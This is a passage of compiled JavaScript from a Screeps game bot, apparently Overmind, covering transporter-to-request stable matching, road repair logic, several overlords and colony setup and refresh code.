    // Functions for computing resource change rate ====================================================================
    /**
     * Consider all possibilities of buffer structures to visit on the way to fulfilling the request
     */
    bufferChoices(transporter, request) {
        const [ticksUntilFree, newPos] = this.nextAvailability(transporter);
        const choices = [];
        const amount = this.predictedRequestAmount(transporter, request, [ticksUntilFree, newPos]);
        let carry;
        if (!transporter.task || transporter.task.target != request.target) {
            // If you are not targeting the requestor, use predicted carry after completing current task
            carry = this.predictedTransporterCarry(transporter);
        }
        else {
            // If you are targeting the requestor, use current carry for computations
            carry = transporter.carry;
        }
        if (amount > 0) { // requestInput instance, needs refilling
            if (request.resourceType == 'all') {
                log.warning(`Improper resourceType in bufferChoices! Type 'all' is only allowable for outputs!`);
                return [];
            }
            // Change in resources if transporter goes straight to the input
            const dQ_direct = Math.min(amount, carry[request.resourceType] || 0);
            // let dt_direct = Pathing.distance(newPos, request.target.pos) + ticksUntilFree;
            const dt_direct = ticksUntilFree + newPos.getMultiRoomRangeTo(request.target.pos)
                * LogisticsNetwork_1.settings.rangeToPathHeuristic;
            choices.push({
                dQ: dQ_direct,
                dt: dt_direct,
                targetRef: request.target.ref
            });
            if ((carry[request.resourceType] || 0) > amount || _.sum(carry) == transporter.carryCapacity) {
                return choices; // Return early if you already have enough resources to go direct or are already full
            }
            // Change in resources if transporter picks up resources from a buffer first
            for (const buffer of this.buffers) {
                const dQ_buffer = Math.min(amount, transporter.carryCapacity, buffer.store[request.resourceType] || 0);
                const dt_buffer = newPos.getMultiRoomRangeTo(buffer.pos) * LogisticsNetwork_1.settings.rangeToPathHeuristic
                    + Pathing.distance(buffer.pos, request.target.pos) + ticksUntilFree;
                choices.push({
                    dQ: dQ_buffer,
                    dt: dt_buffer,
                    targetRef: buffer.ref
                });
            }
        }
        else if (amount < 0) { // requestOutput instance, needs pickup
            // Change in resources if transporter goes straight to the output
            const remainingCarryCapacity = transporter.carryCapacity - _.sum(carry);
            const dQ_direct = Math.min(Math.abs(amount), remainingCarryCapacity);
            const dt_direct = newPos.getMultiRoomRangeTo(request.target.pos)
                * LogisticsNetwork_1.settings.rangeToPathHeuristic + ticksUntilFree;
            choices.push({
                dQ: dQ_direct,
                dt: dt_direct,
                targetRef: request.target.ref
            });
            if (remainingCarryCapacity >= Math.abs(amount) || remainingCarryCapacity == transporter.carryCapacity) {
                return choices; // Return early you have sufficient free space or are empty
            }
            // Change in resources if transporter drops off resources at a buffer first
            for (const buffer of this.buffers) {
                const dQ_buffer = Math.min(Math.abs(amount), transporter.carryCapacity, buffer.storeCapacity - _.sum(buffer.store));
                const dt_buffer = newPos.getMultiRoomRangeTo(buffer.pos) * LogisticsNetwork_1.settings.rangeToPathHeuristic
                    + Pathing.distance(buffer.pos, request.target.pos) + ticksUntilFree;
                choices.push({
                    dQ: dQ_buffer,
                    dt: dt_buffer,
                    targetRef: buffer.ref
                });
            }
            // if (store.resourceType == RESOURCE_ENERGY) {
            //  // Only for when you're picking up more energy: check to see if you can put to available links
            //  for (let link of this.colony.dropoffLinks) {
            //      let linkDeltaResource = Math.min(Math.abs(amount), transporter.carryCapacity,
            //          2 * link.energyCapacity);
            //      let ticksUntilDropoff = Math.max(Pathing.distance(newPos, link.pos),
            //                                       this.colony.linkNetwork.getDropoffAvailability(link));
            //      let linkDistance = ticksUntilDropoff +
            //                         Pathing.distance(link.pos, store.target.pos) + ticksUntilFree;
            //      choices.push({
            //                       deltaResource: linkDeltaResource,
            //                       deltaTicks   : linkDistance,
            //                       targetRef    : link.ref
            //                   });
            //  }
            // }
        }
        return choices;
    }
    /**
     * Compute the best possible value of |dResource / dt|
     */
    resourceChangeRate(transporter, request) {
        if (!this.cache.resourceChangeRate[request.id]) {
            this.cache.resourceChangeRate[request.id] = {};
        }
        if (!this.cache.resourceChangeRate[request.id][transporter.name]) {
            const choices = this.bufferChoices(transporter, request);
            const dQ_dt = _.map(choices, choice => request.multiplier * choice.dQ / Math.max(choice.dt, 0.1));
            this.cache.resourceChangeRate[request.id][transporter.name] = _.max(dQ_dt);
        }
        return this.cache.resourceChangeRate[request.id][transporter.name];
    }
    /**
     * Generate requestor preferences in terms of transporters
     */
    requestPreferences(request, transporters) {
        // Requestors priortize transporters by change in resources per tick until pickup/delivery
        return _.sortBy(transporters, transporter => -1 * this.resourceChangeRate(transporter, request)); // -1 -> desc
    }
    /**
     * Generate transporter preferences in terms of store structures
     */
    transporterPreferences(transporter) {
        // Transporters prioritize requestors by change in resources per tick until pickup/delivery
        return _.sortBy(this.requests, request => -1 * this.resourceChangeRate(transporter, request)); // -1 -> desc
    }
    /**
     * Invalidates relevant portions of the cache once a transporter is assigned to a task
     */
    invalidateCache(transporter, request) {
        delete this.cache.nextAvailability[transporter.name];
        delete this.cache.predictedTransporterCarry[transporter.name];
        delete this.cache.resourceChangeRate[request.id][transporter.name];
    }
    /**
     * Logs the output of the stable matching result
     */
    summarizeMatching() {
        const requests = this.requests.slice();
        const transporters = _.filter(this.colony.getCreepsByRole(Roles.transport), creep => !creep.spawning);
        const unmatchedTransporters = _.remove(transporters, transporter => !_.keys(this._matching).includes(transporter.name));
        const unmatchedRequests = _.remove(requests, request => !_.values(this._matching).includes(request));
        console.log(`Stable matching for ${this.colony.name} at ${Game.time}`);
        for (const transporter of transporters) {
            const transporterStr = transporter.name + ' ' + transporter.pos;
            const request = this._matching[transporter.name];
            const requestStr = request.target.ref + ' ' + request.target.pos.print;
            console.log(`${transporterStr.padRight(30)} : ${requestStr}`);
        }
        for (const transporter of unmatchedTransporters) {
            const transporterStr = transporter.name + ' ' + transporter.pos;
            console.log(`${transporterStr.padRight(30)} : ${''}`);
        }
        for (const request of unmatchedRequests) {
            const requestStr = request.target.ref + ' ' + request.target.pos;
            console.log(`${''.padRight(30)} : ${requestStr}`);
        }
        console.log();
    }
    /**
     * Logs the current state of the logistics group to the console; useful for debugging
     */
    summarize() {
        // console.log(`Summary of logistics group for ${this.colony.name} at time ${Game.time}`);
        let info = [];
        for (const request of this.requests) {
            let targetType;
            if (request.target instanceof Resource) {
                targetType = 'resource';
            }
            else if (request.target instanceof Tombstone) {
                targetType = 'tombstone';
            }
            else {
                targetType = request.target.structureType;
            }
            let amount = 0;
            if (isResource(request.target)) {
                amount = request.target.amount;
            }
            else {
                if (request.resourceType == 'all') {
                    if (isTombstone(request.target) || isStoreStructure(request.target)) {
                        amount = _.sum(request.target.store);
                    }
                    else if (isEnergyStructure(request.target)) {
                        amount = -0.001;
                    }
                }
                else {
                    if (isTombstone(request.target) || isStoreStructure(request.target)) {
                        amount = request.target.store[request.resourceType] || 0;
                    }
                    else if (isEnergyStructure(request.target)) {
                        amount = request.target.energy;
                    }
                }
            }
            const targetingTprtrNames = _.map(LogisticsNetwork_1.targetingTransporters(request.target), c => c.name);
            info.push({
                target: targetType,
                resourceType: request.resourceType,
                requestAmount: request.amount,
                currentAmount: amount,
                targetedBy: targetingTprtrNames,
                pos: request.target.pos.print,
            });
        }
        console.log('Requests: \n' + columnify(info) + '\n');
        info = [];
        for (const transporter of this.colony.overlords.logistics.transporters) {
            const task = transporter.task ? transporter.task.name : 'none';
            const target = transporter.task ?
                transporter.task.proto._target.ref + ' ' + transporter.task.targetPos.printPlain : 'none';
            const nextAvailability = this.nextAvailability(transporter);
            info.push({
                creep: transporter.name,
                pos: transporter.pos.printPlain,
                task: task,
                target: target,
                availability: `available in ${nextAvailability[0]} ticks at ${nextAvailability[1].print}`,
            });
        }
        console.log('Transporters: \n' + columnify(info) + '\n');
    }
    get matching() {
        if (!this._matching) {
            this._matching = this.stableMatching(this.colony.overlords.logistics.transporters);
        }
        return this._matching;
    }
    /**
     * Generate a stable matching of transporters to requests with Gale-Shapley algorithm
     */
    stableMatching(transporters) {
        const tPrefs = {};
        for (const transporter of transporters) {
            tPrefs[transporter.name] = _.map(this.transporterPreferences(transporter), request => request.id);
        }
        const rPrefs = {};
        for (const request of this.requests) {
            rPrefs[request.id] = _.map(this.requestPreferences(request, transporters), transporter => transporter.name);
        }
        const stableMatching = new Matcher(tPrefs, rPrefs).match();
        const requestMatch = _.mapValues(stableMatching, reqID => _.find(this.requests, request => request.id == reqID));
        return requestMatch;
    }
};
LogisticsNetwork.settings = {
    flagDropAmount: 1000,
    rangeToPathHeuristic: 1.1,
    carryThreshold: 800,
    droppedEnergyThreshold: 200,
};
LogisticsNetwork = LogisticsNetwork_1 = __decorate([
    profile
], LogisticsNetwork);

var RoadLogistics_1;
const ROAD_CACHE_TIMEOUT = 15;
/**
 * RoadLogistics: groups roads in a single object for more intelligent repair requests
 */
let RoadLogistics = RoadLogistics_1 = class RoadLogistics {
    constructor(colony) {
        this.colony = colony;
        this.ref = this.colony.name + ':roadLogistics';
        this.rooms = colony.rooms;
        this._assignedWorkers = {};
    }
    refresh() {
        this._assignedWorkers = {};
    }
    /**
     * Whether a road in the network needs repair
     */
    workerShouldRepaveRoom(worker, room) {
        // Room should be repaved if there is a road with critical HP or if energy to repave >= worker carry capacity
        const otherAssignedWorkers = _.filter(this.assignedWorkers(room), name => name != worker.name);
        if (otherAssignedWorkers.length < RoadLogistics_1.settings.allowedPaversPerRoom) {
            if (this.assignedWorkers(room).includes(worker.name)) {
                // If worker is already working in the room, have it repair until all roads are at acceptable level
                return this.repairableRoads(room).length > 0;
            }
            else {
                // If worker is not already assigned, repair if critical roads or repaving energy >= carry capacity
                return this.criticalRoads(room).length > 0 || this.energyToRepave(room) >= worker.carryCapacity;
            }
        }
        else {
            return false;
        }
    }
    /**
     * Get the room the worker should repave, if any
     */
    workerShouldRepave(worker) {
        // If the worker is already working in a room and should keep doing so, return that first
        if (worker.task && worker.task.name == repairTaskName) {
            const room = Game.rooms[worker.task.targetPos.roomName];
            if (room && this.assignedWorkers(room).includes(worker.name)
                && this.workerShouldRepaveRoom(worker, room)) {
                return room;
            }
        }
        // Otherwise scan through rooms and see if needs repaving
        for (const room of this.rooms) {
            if (this.workerShouldRepaveRoom(worker, room)) {
                return room;
            }
        }
    }
    // /* Compute roads ordered by a depth-first search from a root node */
    // roads(room: Room): StructureRoad[] {
    //
    // }
    criticalRoads(room) {
        return $.structures(this, 'criticalRoads:' + room.name, () => _.sortBy(_.filter(room.roads, road => road.hits < road.hitsMax * RoadLogistics_1.settings.criticalThreshold &&
            this.colony.roomPlanner.roadShouldBeHere(road.pos)), road => road.pos.getMultiRoomRangeTo(this.colony.pos)), ROAD_CACHE_TIMEOUT);
    }
    repairableRoads(room) {
        return $.structures(this, 'repairableRoads:' + room.name, () => _.sortBy(_.filter(room.roads, road => road.hits < road.hitsMax * RoadLogistics_1.settings.repairThreshold &&
            this.colony.roomPlanner.roadShouldBeHere(road.pos)), road => road.pos.getMultiRoomRangeTo(this.colony.pos)), ROAD_CACHE_TIMEOUT);
    }
    /**
     * Total amount of energy needed to repair all roads in the room
     */
    energyToRepave(room) {
        return $.number(this, 'energyToRepave:' + room.name, () => _.sum(this.repairableRoads(room), road => (road.hitsMax - road.hits) / REPAIR_POWER));
    }
    /**
     * Check that the worker is in the assignedWorker cache; avoids bugs where duplicate workers get assigned
     * on the same tick
     */
    registerWorkerAssignment(worker, room) {
        if (this._assignedWorkers[room.name]) {
            if (!this._assignedWorkers[room.name].includes(worker.name)) {
                this._assignedWorkers[room.name].push(worker.name);
            }
        }
        else {
            this._assignedWorkers[room.name] = [worker.name];
        }
    }
    assignedWorkers(room) {
        return this._assignedWorkers[room.name] || [];
    }
    init() {
        const workers = this.colony.overlords.work.workers;
        for (const worker of workers) {
            if (worker.task && worker.task.name == repairTaskName) {
                const roomName = worker.task.targetPos.roomName;
                if (!this._assignedWorkers[roomName]) {
                    this._assignedWorkers[roomName] = [];
                }
                this._assignedWorkers[roomName].push(worker.name);
            }
        }
    }
    run() {
    }
};
RoadLogistics.settings = {
    allowedPaversPerRoom: 1,
    criticalThreshold: 0.25,
    repairThreshold: 0.9
};
RoadLogistics = RoadLogistics_1 = __decorate([
    profile
], RoadLogistics);

/**
 * This overlord contains the default actions for any creeps which lack an overlord (for example, miners whose
 * miningSite is no longer visible, or guards with no directive)
 */
let DefaultOverlord = class DefaultOverlord extends Overlord {
    constructor(colony) {
        super(colony, 'default', OverlordPriority.default);
        this.idleZerg = [];
    }
    init() {
        // Zergs are collected at end of init phase; by now anything needing to be claimed already has been
        const idleCreeps = _.filter(this.colony.creeps, creep => !getOverlord(creep));
        this.idleZerg = _.map(idleCreeps, creep => Overmind.zerg[creep.name] || new Zerg(creep));
        for (const zerg of this.idleZerg) {
            zerg.refresh();
        }
    }
    run() {
    }
};
DefaultOverlord = __decorate([
    profile
], DefaultOverlord);

/**
 * The transport overlord handles energy transport throughout a colony
 */
let TransportOverlord = class TransportOverlord extends Overlord {
    constructor(colony, priority = OverlordPriority.ownedRoom.transport) {
        super(colony, 'logistics', priority);
        this.transporters = this.zerg(Roles.transport);
    }
    neededTransportPower() {
        if (!this.colony.storage
            && !(this.colony.hatchery && this.colony.hatchery.battery)
            && !this.colony.upgradeSite.battery) {
            return 0;
        }
        let transportPower = 0;
        const scaling = 2; // this.colony.stage == ColonyStage.Larva ? 1.5 : 2.0; // aggregate round-trip multiplier
        // Add contributions to transport power from hauling energy from mining sites
        for (const flagName in this.colony.miningSites) {
            const o = this.colony.miningSites[flagName].overlords.mine;
            if (!o.isSuspended && o.miners.length > 0) {
                // Only count sites which have a container output and which have at least one miner present
                // (this helps in difficult "rebooting" situations)
                if ((o.container && !o.link) || o.allowDropMining) {
                    transportPower += o.energyPerTick * scaling * o.distance;
                }
            }
        }
        // Add transport power needed to move to upgradeSite
        if (this.colony.upgradeSite.battery) {
            transportPower += UPGRADE_CONTROLLER_POWER * this.colony.upgradeSite.upgradePowerNeeded * scaling *
                Pathing.distance(this.colony.pos, this.colony.upgradeSite.battery.pos);
        }
        if (this.colony.lowPowerMode) {
            // Reduce needed transporters when colony is in low power mode
            transportPower *= 0.5;
        }
        return transportPower / CARRY_CAPACITY;
    }
    init() {
        const ROAD_COVERAGE_THRESHOLD = 0.75; // switch from 1:1 to 2:1 transporters above this coverage threshold
        const setup = this.colony.roomPlanner.roadPlanner.roadCoverage < ROAD_COVERAGE_THRESHOLD
            ? Setups.transporters.early : Setups.transporters.default;
        const transportPowerEach = setup.getBodyPotential(CARRY, this.colony);
        const neededTransportPower = this.neededTransportPower();
        const numTransporters = Math.ceil(neededTransportPower / transportPowerEach);
        if (this.transporters.length == 0) {
            this.wishlist(numTransporters, setup, { priority: OverlordPriority.ownedRoom.firstTransport });
        }
        else {
            this.wishlist(numTransporters, setup);
        }
    }
    handleTransporter(transporter, request) {
        if (request) {
            const choices = this.colony.logisticsNetwork.bufferChoices(transporter, request);
            const bestChoice = _.last(_.sortBy(choices, choice => request.multiplier * choice.dQ
                / Math.max(choice.dt, 0.1)));
            let task = null;
            const amount = this.colony.logisticsNetwork.predictedRequestAmount(transporter, request);
            // Target is requesting input
            if (amount > 0) {
                if (isResource(request.target) || isTombstone(request.target)) {
                    log.warning(`Improper logistics request: should not request input for resource or tombstone!`);
                    return;
                }
                else if (request.resourceType == 'all') {
                    log.error(`${this.print}: cannot request 'all' as input!`);
                    return;
                }
                else {
                    task = Tasks.transfer(request.target, request.resourceType);
                }
                if (bestChoice.targetRef != request.target.ref) {
                    // If we need to go to a buffer first to get more stuff
                    const buffer = deref(bestChoice.targetRef);
                    const withdrawAmount = Math.min(buffer.store[request.resourceType] || 0, transporter.carryCapacity - _.sum(transporter.carry), amount);
                    task = task.fork(Tasks.withdraw(buffer, request.resourceType, withdrawAmount));
                    if (transporter.hasMineralsInCarry && request.resourceType == RESOURCE_ENERGY) {
                        task = task.fork(Tasks.transferAll(buffer));
                    }
                }
            }
            // Target is requesting output
            else if (amount < 0) {
                if (isResource(request.target)) {
                    task = Tasks.pickup(request.target);
                }
                else {
                    if (request.resourceType == 'all') {
                        if (!isStoreStructure(request.target) && !isTombstone(request.target)) {
                            log.error(`TransportOverlord: ` + ALL_RESOURCE_TYPE_ERROR);
                            return;
                        }
                        task = Tasks.withdrawAll(request.target);
                    }
                    else {
                        task = Tasks.withdraw(request.target, request.resourceType);
                    }
                }
                if (task && bestChoice.targetRef != request.target.ref) {
                    // If we need to go to a buffer first to deposit stuff
                    const buffer = deref(bestChoice.targetRef);
                    task = task.fork(Tasks.transferAll(buffer));
                }
            }
            else {
                // console.log(`${transporter.name} chooses a store with 0 amount!`);
                transporter.park();
            }
            // Assign the task to the transporter
            transporter.task = task;
            this.colony.logisticsNetwork.invalidateCache(transporter, request);
        }
        else {
            // If nothing to do, put everything in a store structure
            if (_.sum(transporter.carry) > 0) {
                if (transporter.hasMineralsInCarry) {
                    const target = this.colony.terminal || this.colony.storage;
                    if (target) {
                        transporter.task = Tasks.transferAll(target);
                    }
                }
                else {
                    const dropoffPoints = _.compact([this.colony.storage]);
                    // , ...this.colony.dropoffLinks]);
                    // let bestDropoffPoint = minBy(dropoffPoints, function(dropoff: StructureLink | StructureStorage) {
                    //  let range = transporter.pos.getMultiRoomRangeTo(dropoff.pos);
                    //  if (dropoff instanceof StructureLink) {
                    //      return Math.max(range, this.colony.linkNetwork.getDropoffAvailability(dropoff));
                    //  } else {
                    //      return range;
                    //  }
                    // });
                    const bestDropoffPoint = transporter.pos.findClosestByMultiRoomRange(dropoffPoints);
                    if (bestDropoffPoint)
                        transporter.task = Tasks.transfer(bestDropoffPoint);
                }
            }
            else {
                let parkingSpot = transporter.pos;
                if (this.colony.storage) {
                    parkingSpot = this.colony.storage.pos;
                }
                else if (this.colony.roomPlanner.storagePos) {
                    parkingSpot = this.colony.roomPlanner.storagePos;
                }
                transporter.park(parkingSpot);
            }
        }
        // console.log(JSON.stringify(transporter.memory.task));
    }
    handleBigTransporter(bigTransporter) {
        const bestRequestViaStableMatching = this.colony.logisticsNetwork.matching[bigTransporter.name];
        this.handleTransporter(bigTransporter, bestRequestViaStableMatching);
    }
    /* Handles small transporters, which don't do well with the logisticsNetwork's stable matching system */
    handleSmolTransporter(smolTransporter) {
        // Just perform a single-sided greedy selection of all requests
        const bestRequestViaGreedy = _.first(this.colony.logisticsNetwork.transporterPreferences(smolTransporter));
        this.handleTransporter(smolTransporter, bestRequestViaGreedy);
    }
    pickupDroppedResources(transporter) {
        const droppedResource = transporter.pos.lookFor(LOOK_RESOURCES)[0];
        if (droppedResource) {
            transporter.pickup(droppedResource);
            return;
        }
        const tombstone = transporter.pos.lookFor(LOOK_TOMBSTONES)[0];
        if (tombstone) {
            const resourceType = _.last(_.sortBy(_.keys(tombstone.store), resourceType => (tombstone.store[resourceType] || 0)));
            transporter.withdraw(tombstone, resourceType);
        }
    }
    run() {
        this.autoRun(this.transporters, transporter => this.handleSmolTransporter(transporter));
    }
};
TransportOverlord = __decorate([
    profile
], TransportOverlord);

const DEFAULT_NUM_SCOUTS = 3;
/**
 * Sends out scouts which randomly traverse rooms to uncover possible expansion locations and gather intel
 */
let RandomWalkerScoutOverlord = class RandomWalkerScoutOverlord extends Overlord {
    constructor(colony, priority = OverlordPriority.scouting.randomWalker) {
        super(colony, 'scout', priority);
        this.scouts = this.zerg(Roles.scout, { notifyWhenAttacked: false });
    }
    init() {
        this.wishlist(DEFAULT_NUM_SCOUTS, Setups.scout);
    }
    handleScout(scout) {
        // Stomp on enemy construction sites
        const enemyConstructionSites = scout.room.find(FIND_HOSTILE_CONSTRUCTION_SITES);
        if (enemyConstructionSites.length > 0) {
            scout.goTo(enemyConstructionSites[0].pos);
        }
        // Check if room might be connected to newbie/respawn zone
        const indestructibleWalls = _.filter(scout.room.walls, wall => wall.hits == undefined);
        if (indestructibleWalls.length > 0) { // go back to origin colony if you find a room near newbie zone
            scout.task = Tasks.goToRoom(scout.colony.room.name); // todo: make this more precise
        }
        else {
            // Pick a new room
            const neighboringRooms = _.values(Game.map.describeExits(scout.pos.roomName));
            const roomName = _.sample(neighboringRooms);
            if (Game.map.isRoomAvailable(roomName)) {
                scout.task = Tasks.goToRoom(roomName);
            }
        }
    }
    run() {
        this.autoRun(this.scouts, scout => this.handleScout(scout));
    }
};
RandomWalkerScoutOverlord = __decorate([
    profile
], RandomWalkerScoutOverlord);

var ColonyStage;
(function (ColonyStage) {
    ColonyStage[ColonyStage["Larva"] = 0] = "Larva";
    ColonyStage[ColonyStage["Pupa"] = 1] = "Pupa";
    ColonyStage[ColonyStage["Adult"] = 2] = "Adult";
})(ColonyStage || (ColonyStage = {}));
var DEFCON;
(function (DEFCON) {
    DEFCON[DEFCON["safe"] = 0] = "safe";
    DEFCON[DEFCON["invasionNPC"] = 1] = "invasionNPC";
    DEFCON[DEFCON["boostedInvasionNPC"] = 2] = "boostedInvasionNPC";
    DEFCON[DEFCON["playerInvasion"] = 2] = "playerInvasion";
    DEFCON[DEFCON["bigPlayerInvasion"] = 3] = "bigPlayerInvasion";
})(DEFCON || (DEFCON = {}));
function getAllColonies() {
    return _.values(Overmind.colonies);
}
const defaultColonyMemory = {
    defcon: {
        level: DEFCON.safe,
        tick: -Infinity
    },
    expansionData: {
        possibleExpansions: {},
        expiration: 0,
    },
};
/**
 * Colonies are the highest-level object other than the global Overmind. A colony groups together all rooms, structures,
 * creeps, utilities, etc. which are run from a single owned room.
 */
let Colony = class Colony {
    constructor(id, roomName, outposts) {
        // Primitive colony setup
        this.id = id;
        this.name = roomName;
        this.ref = roomName;
        this.memory = Mem.wrap(Memory.colonies, roomName, defaultColonyMemory, true);
        // Register colony globally to allow 'W1N1' and 'w1n1' to refer to Overmind.colonies.W1N1
        global[this.name] = this;
        global[this.name.toLowerCase()] = this;
        // Build the colony
        this.build(roomName, outposts);
    }
    /**
     * Pretty-print the colony name in the console
     */
    get print() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.room.name + '">[' + this.name + ']</a>';
    }
    /**
     * Builds the colony object
     */
    build(roomName, outposts) {
        // Register rooms
        this.roomNames = [roomName].concat(outposts);
        this.room = Game.rooms[roomName];
        this.outposts = _.compact(_.map(outposts, outpost => Game.rooms[outpost]));
        this.rooms = [this.room].concat(this.outposts);
        this.miningSites = {}; // filled in by harvest directives
        this.extractionSites = {}; // filled in by extract directives
        // Register creeps
        this.creeps = Overmind.cache.creepsByColony[this.name] || [];
        this.creepsByRole = _.groupBy(this.creeps, creep => creep.memory.role);
        // Register the rest of the colony components; the order in which these are called is important!
        this.registerRoomObjects_cached(); // Register real colony components
        this.registerOperationalState(); // Set the colony operational state
        this.registerUtilities(); // Register logistics utilities, room planners, and layout info
        this.registerHiveClusters(); // Build the hive clusters
        /* Colony.spawnMoarOverlords() gets called from Overmind.ts, along with Directive.spawnMoarOverlords() */
    }
    /**
     * Refreshes the state of the colony object
     */
    refresh() {
        this.memory = Mem.wrap(Memory.colonies, this.room.name, defaultColonyMemory, true);
        // Refresh rooms
        this.room = Game.rooms[this.room.name];
        this.outposts = _.compact(_.map(this.outposts, outpost => Game.rooms[outpost.name]));
        this.rooms = [this.room].concat(this.outposts);
        // refresh creeps
        this.creeps = Overmind.cache.creepsByColony[this.name] || [];
        this.creepsByRole = _.groupBy(this.creeps, creep => creep.memory.role);
        // Register the rest of the colony components; the order in which these are called is important!
        this.refreshRoomObjects();
        this.registerOperationalState();
        this.refreshUtilities();
        this.refreshHiveClusters();
    }
    /**
     * Registers physical game objects to the colony
     */
    registerRoomObjects() {
        // Create placeholder arrays for remaining properties to be filled in by the Overmind
        this.flags = []; // filled in by directives
        this.destinations = []; // filled in by various hive clusters and directives
        // Register room objects across colony rooms
        this.controller = this.room.controller; // must be controller since colonies are based in owned rooms
        this.spawns = _.sortBy(_.filter(this.room.spawns, spawn => spawn.my && spawn.isActive()), spawn => spawn.ref);
        this.extensions = this.room.extensions;
        this.storage = this.room.storage && this.room.storage.isActive() ? this.room.storage : undefined;
        this.links = this.room.links;
        this.availableLinks = _.clone(this.room.links);
        this.terminal = this.room.terminal && this.room.terminal.isActive() ? this.room.terminal : undefined;
        this.towers = this.room.towers;
        this.labs = _.sortBy(_.filter(this.room.labs, lab => lab.my && lab.isActive()), lab => 50 * lab.pos.y + lab.pos.x); // Labs are sorted in reading order of positions
        this.powerSpawn = this.room.powerSpawn;
        this.nuker = this.room.nuker;
        this.observer = this.room.observer;
        this.pos = (this.storage || this.terminal || this.spawns[0] || this.controller).pos;
        // Register physical objects across all rooms in the colony
        this.sources = _.sortBy(_.flatten(_.map(this.rooms, room => room.sources)), source => source.pos.getMultiRoomRangeTo(this.pos));
        this.extractors = _(this.rooms)
            .map(room => room.extractor)
            .compact()
            .filter(extractor => (extractor.my && extractor.room.my)
            || Cartographer.roomType(extractor.room.name) != ROOMTYPE_CONTROLLER)
            .sortBy(extractor => extractor.pos.getMultiRoomRangeTo(this.pos)).value();
        this.constructionSites = _.flatten(_.map(this.rooms, room => room.constructionSites));
        this.tombstones = _.flatten(_.map(this.rooms, room => room.tombstones));
        this.drops = _.merge(_.map(this.rooms, room => room.drops));
        this.repairables = _.flatten(_.map(this.rooms, room => room.repairables));
        this.rechargeables = _.flatten(_.map(this.rooms, room => room.rechargeables));
        // Register assets
        this.assets = this.getAllAssets();
    }
    /**
     * Version of Colony.registerRoomObjects with additional caching functionality
     */
    registerRoomObjects_cached() {
        // Create placeholder arrays for remaining properties to be filled in by the Overmind
        this.flags = []; // filled in by directives
        this.destinations = []; // filled in by various hive clusters and directives
        // Register room objects across colony rooms
        this.controller = this.room.controller; // must be controller since colonies are based in owned rooms
        this.extensions = this.room.extensions;
        this.links = this.room.links;
        this.availableLinks = _.clone(this.room.links);
        this.towers = this.room.towers;
        this.powerSpawn = this.room.powerSpawn;
        this.nuker = this.room.nuker;
        this.observer = this.room.observer;
        $.set(this, 'spawns', () => _.sortBy(_.filter(this.room.spawns, spawn => spawn.my && spawn.isActive()), spawn => spawn.ref));
        $.set(this, 'storage', () => this.room.storage && this.room.storage.isActive() ? this.room.storage : undefined);
        // this.availableLinks = _.clone(this.room.links);
        $.set(this, 'terminal', () => this.room.terminal && this.room.terminal.isActive() ? this.room.terminal : undefined);
        $.set(this, 'labs', () => _.sortBy(_.filter(this.room.labs, lab => lab.my && lab.isActive()), lab => 50 * lab.pos.y + lab.pos.x));
        this.pos = (this.storage || this.terminal || this.spawns[0] || this.controller).pos;
        // Register physical objects across all rooms in the colony
        $.set(this, 'sources', () => _.sortBy(_.flatten(_.map(this.rooms, room => room.sources)), source => source.pos.getMultiRoomRangeTo(this.pos)));
        for (const source of this.sources) {
            DirectiveHarvest.createIfNotPresent(source.pos, 'pos');
        }
        $.set(this, 'extractors', () => _(this.rooms)
            .map(room => room.extractor)
            .compact()
            .filter(e => (e.my && e.room.my)
            || Cartographer.roomType(e.room.name) != ROOMTYPE_CONTROLLER)
            .sortBy(e => e.pos.getMultiRoomRangeTo(this.pos)).value());
        if (this.controller.level >= 6) {
            _.forEach(this.extractors, extractor => DirectiveExtract.createIfNotPresent(extractor.pos, 'pos'));
        }
        $.set(this, 'repairables', () => _.flatten(_.map(this.rooms, room => room.repairables)));
        $.set(this, 'rechargeables', () => _.flatten(_.map(this.rooms, room => room.rechargeables)));
        $.set(this, 'constructionSites', () => _.flatten(_.map(this.rooms, room => room.constructionSites)), 10);
        $.set(this, 'tombstones', () => _.flatten(_.map(this.rooms, room => room.tombstones)), 5);
        this.drops = _.merge(_.map(this.rooms, room => room.drops));
        // Register assets
        this.assets = this.getAllAssets();
    }
    /**
     * Refresh the state of all physical game objects in the colony
     */
    refreshRoomObjects() {
        $.refresh(this, 'controller', 'extensions', 'links', 'towers', 'powerSpawn', 'nuker', 'observer', 'spawns', 'storage', 'terminal', 'labs', 'sources', 'extractors', 'constructionSites', 'repairables', 'rechargeables');
        $.set(this, 'constructionSites', () => _.flatten(_.map(this.rooms, room => room.constructionSites)), 10);
        $.set(this, 'tombstones', () => _.flatten(_.map(this.rooms, room => room.tombstones)), 5);
        this.drops = _.merge(_.map(this.rooms, room => room.drops));
        // Re-compute assets
        this.assets = this.getAllAssets();
    }
    /**
     * Registers the operational state of the colony, computing things like colony maturity, DEFCON level, etc.
     */
    registerOperationalState() {
        this.level = this.controller.level;
        this.bootstrapping = false;
        this.isIncubating = false;
        if (this.storage && this.spawns[0]) {
            // If the colony has storage and a hatchery
            if (this.controller.level == 8) {
                this.stage = ColonyStage.Adult;
            }
            else {
                this.stage = ColonyStage.Pupa;
            }
        }
        else {
            this.stage = ColonyStage.Larva;
        }
        // this.incubatingColonies = [];
        this.lowPowerMode = Energetics.lowPowerMode(this);
        // Set DEFCON level
        // TODO: finish this
        let defcon = DEFCON.safe;
        const defconDecayTime = 200;
        if (this.room.dangerousHostiles.length > 0 && !this.controller.safeMode) {
            const effectiveHostileCount = _.sum(_.map(this.room.dangerousHostiles, hostile => hostile.boosts.length > 0 ? 2 : 1));
            if (effectiveHostileCount >= 3) {
                defcon = DEFCON.boostedInvasionNPC;
            }
            else {
                defcon = DEFCON.invasionNPC;
            }
        }
        if (this.memory.defcon) {
            if (defcon < this.memory.defcon.level) { // decay defcon level over time if defcon less than memory value
                if (this.memory.defcon.tick + defconDecayTime < Game.time) {
                    this.memory.defcon.level = defcon;
                    this.memory.defcon.tick = Game.time;
                }
            }
            else if (defcon > this.memory.defcon.level) { // refresh defcon time if it increases by a level
                this.memory.defcon.level = defcon;
                this.memory.defcon.tick = Game.time;
            }
        }
        else {
            this.memory.defcon = {
                level: defcon,
                tick: Game.time
            };
        }
        this.defcon = this.memory.defcon.level;
        this.breached = (this.room.dangerousHostiles.length > 0 &&
            this.creeps.length == 0 &&
            !this.controller.safeMode);
        this.terminalState = undefined;
    }
    /**
     * Registers utility classes such as logistics networks
     */
    registerUtilities() {
        // Resource requests
        this.linkNetwork = new LinkNetwork(this);
        this.logisticsNetwork = new LogisticsNetwork(this);
        this.transportRequests = new TransportRequestGroup();
